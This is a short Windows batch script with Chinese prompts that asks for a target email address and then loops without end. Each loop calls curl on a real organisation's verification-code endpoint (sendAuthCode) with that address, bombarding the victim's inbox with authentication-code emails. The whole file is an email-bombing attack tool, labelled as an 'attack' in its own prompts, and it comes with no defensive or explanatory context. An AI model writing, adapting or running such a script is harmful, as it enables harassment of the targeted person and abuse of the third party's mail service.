@echo off
set /p mail=请输入需要攻击的邮箱：
set i=0
:start
set /a i+=1
echo [%i%] 攻击目标：%mail%
curl -ssl https://web.ccf.org.cn/CCF/apply/user!sendAuthCode.action?email=%mail%
goto start: